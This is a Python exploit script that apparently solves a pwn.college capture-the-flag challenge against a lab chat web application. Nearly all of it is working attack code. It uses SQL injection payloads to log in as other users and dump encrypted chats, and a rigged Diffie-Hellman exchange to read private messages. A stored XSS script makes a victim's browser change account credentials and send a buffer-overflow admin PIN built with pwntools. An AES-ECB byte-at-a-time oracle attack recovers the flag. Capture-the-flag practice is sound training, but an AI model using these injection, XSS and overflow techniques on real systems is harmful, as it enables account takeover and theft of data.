import os
import re
import sys
import pwn
import time
import requests
import urllib.parse
import Crypto.Cipher.AES
import Crypto.Util.Padding
import scapy.layers.tls.crypto.groups

API = "http://10.0.0.1:80"
DH_p = scapy.layers.tls.crypto.groups.modp2048.m
DH_g = scapy.layers.tls.crypto.groups.modp2048.g


def login_as(username: str) -> requests.Session:
    session = requests.Session()
    if username == "alice":
        injected_username = "' UNION SELECT 'alice','irrelevant',0-- "
    else:
        injected_username = f"{username}'-- "
    login_payload = {"username": injected_username, "password": "password"}
    session.post(f"{API}/login", data=login_payload)
    return session


def check_password(username: str, password: str) -> bool:
    username = username.replace("'", "''")  # sql escape
    login_payload = {"username": username, "password": password}
    response = requests.post(f"{API}/login", data=login_payload)
    return response.status_code == 200


def send_message(session: requests.Session, peer: str, message: str):
    session.post(f"{API}/chat/{urllib.parse.quote(peer)}", data={"message": message})


def receive_message(session: requests.Session, peer: str) -> str:
    response = session.get(f"{API}/chat/{urllib.parse.quote(peer)}")
    return response.text


def extract_encrypted_chats():
    injected_username = (
        "' UNION SELECT encrypted_contents, 'password', false "
        "from encrypted_chats where encrypted_username_1 is null or encrypted_username_2 is null"
        "-- "
    )
    login_payload = {"username": injected_username, "password": "password"}
    response = requests.post(f"{API}/login", data=login_payload)
    if match := re.search(r"Hello (.*)!", response.text):
        return match.group(1)
    raise Exception(f"encrypted chats not found in response: {response.text}")


def crack_aes_ecb(encrypt_oracle, known_cleartext=b"", block_size=16, charset=None):
    cleartext = known_cleartext
    guess_idx = len(cleartext)
    guess_len = 1
    if charset is None:
        import string

        # some punctuation is hard to escape
        charset = string.ascii_letters + string.digits + "+-_~!?: {,.}[]()"
    charset = [bytes([c]) for c in charset.encode()]

    def append_margin(f):
        safe_margin = block_size

        def wrapper(payload):
            return f(b"m" * safe_margin + payload)[safe_margin:]

        return wrapper

    encrypt_oracle = append_margin(encrypt_oracle)

    while True:
        pad_len = block_size - (guess_idx % block_size) - guess_len
        pad_data = b"a" * pad_len

        target_cipher = encrypt_oracle(pad_data)
        target_start = (guess_idx // block_size) * block_size
        target_block = target_cipher[target_start : target_start + block_size]

        known_prefix = (pad_data + cleartext)[-block_size + guess_len :]
        guess_payload = b"".join(known_prefix + c for c in charset)

        guess_cipher = encrypt_oracle(guess_payload)
        if not guess_cipher:
            pwn.info("Encryption oracle returned empty response, stopping.")
            break
        for i, guess_char in enumerate(charset):
            char_start = i * block_size
            char_block = guess_cipher[char_start : char_start + block_size]
            if char_block == target_block:
                cleartext += guess_char
                pwn.info(f"Recovered cleartext so far: {cleartext.decode()}")
                break
        else:
            pwn.info("Charset exhausted without finding a match.")
            break

        guess_idx += 1

    pwn.success(f"Recovered cleartext: {cleartext.decode()}")


def reveal_sharon_username():
    session = login_as("mallory")
    send_message(session, "alice", "I heard someone shared the flag with Bob!")
    pwn.info("Told Alice about the flag sharing")

    session = login_as("alice")
    dh_a = 0
    dh_A = pow(DH_g, dh_a, mod=DH_p)
    opening_message = (
        "Hey Bob, I need to chat with you about something important. "
        f"Let's chat securely over DHE-AES: {dh_A}."
    )
    send_message(session, "bob", opening_message)
    pwn.info("Sent DHE-AES initiation message to Bob, waiting for his response...")

    while True:
        chat_text = receive_message(session, "bob")
        if match := re.search(r"bob: Hey Alice, sure: (\d+)\.", chat_text):
            dh_B = int(match.group(1))
            break
        time.sleep(1)

    dh_s = pow(dh_B, dh_a, mod=DH_p)
    aes_key = dh_s.to_bytes(256, "big")[:16]
    pwn.info(f"AES key derived from DHE exchange")

    cipher_send = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_ECB)
    cipher_recv = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_ECB)

    def encrypt(data):
        return cipher_send.encrypt(
            Crypto.Util.Padding.pad(data.encode(), cipher_send.block_size)
        ).hex()

    def decrypt(data):
        return Crypto.Util.Padding.unpad(
            cipher_recv.decrypt(bytes.fromhex(data)),
            cipher_recv.block_size,
        ).decode()

    question = "Hey Bob, I know that someone shared the flag with you. Who was it?"
    send_message(session, "bob", encrypt(question))
    pwn.info("Sent question to Bob, waiting for his response...")

    while True:
        chat_text = receive_message(session, "bob")
        for encrypted_message in re.findall(r"bob: ([0-9a-f]+)", chat_text):
            try:
                decrypted_message = decrypt(encrypted_message)
            except Exception:
                continue
            if match := re.search(r"Oh, it was '(.+?)'\.", decrypted_message):
                sharon_username = match.group(1)
                pwn.info(f"Sharon's username: {sharon_username}")
                return sharon_username
        time.sleep(1)


def change_username(old_name: str):
    session = login_as("mallory")
    password = "password"
    payload: bytes = pwn.cyclic(0x58) + pwn.p64(0x401256) + b"00000000"
    admin_pin: str = payload.decode("utf-8")
    admin_pin = admin_pin.replace("\x12", "\\x12")
    admin_pin = admin_pin.replace("\x00", "\\x00")

    while True:
        new_name = yield
        xss_old_name = urllib.parse.quote(old_name)
        xss_new_name = new_name.replace("'", "''")  # sql escape
        xss_payload = f"""
<script>(() => {{
const send = (url, obj) => fetch(url, {{method:'POST', body: new URLSearchParams(obj)}});
send('/user/{xss_old_name}/modify', {{'username': '{xss_new_name}', 'password': '{password}', 'admin_pin': '{admin_pin}'}});
}})();</script>
"""
        # pwn.info(xss_payload)
        # pwn.info(f"Changing {old_name} to {new_name} via XSS")
        send_message(session, "alice", xss_payload)
        while not check_password(new_name, password):
            pwn.sleep(1)
        old_name = new_name


def tee(process: pwn.tube):
    orig_send_raw = process.send_raw
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def send_raw(data, *args, **kwargs):
        output.write(data)
        output.flush()
        return orig_send_raw(data, *args, **kwargs)

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.send_raw = send_raw
    process.recv_raw = recv_raw


STOP_SIGNAL = "--- DONE ---"


def hack():
    encryptor = change_username("bob")
    encryptor.send(None)
    encryptor.send(reveal_sharon_username())

    def encrypt_oracle(payload: bytes) -> bytes:
        encryptor.send(payload.decode())
        chat_bytes = extract_encrypted_chats()
        return bytes.fromhex(chat_bytes)

    crack_aes_ecb(encrypt_oracle, b": The flag is pwn.college{")
    print(STOP_SIGNAL)


REMOTE_SCRIPT = "/tmp/pwnsolver.py"


def boot():
    with pwn.process(["/challenge/run"]) as io:
        tee(io)
        # wait for signal of bootup completion
        io.recvuntil(b"\r")
        io.info("Starting the hacking script...")
        io.sendline(f"python3 {REMOTE_SCRIPT} hack".encode())
        # keep triggering tee's recv_raw until it receives the stop signal
        io.recvuntil(STOP_SIGNAL.encode())
        # send EOF to stop the process
        io.shutdown()
        io.info("Done! Check the output above for the flag.")


def main():
    # raw to skip checksec
    ssh = pwn.ssh(user="hacker", host="dojo.pwn.college", raw=True)
    local_script = os.path.abspath(__file__)
    ssh.upload(local_script, REMOTE_SCRIPT)
    argv = ["/run/dojo/bin/python3", REMOTE_SCRIPT]
    # requires patch from https://github.com/Gallopsled/pwntools/pull/2627 on Python 3.14+
    io: pwn.tubes.ssh.ssh_process
    io = ssh.process(argv, argv[0], aslr=True)  # type: ignore
    tee(io)
    # keep triggering tee's recv_raw until remote process joins
    try:
        io.recvrepeat()
    except KeyboardInterrupt:
        if io.pid:
            ssh.system(f"kill {io.pid}").wait()
        io.kill()
    else:
        io.wait()


if __name__ == "__main__":
    if sys.argv[1:2] == ["hack"]:
        hack()
    elif os.environ.get("DOJO_AUTH_TOKEN"):
        boot()
    else:
        main()
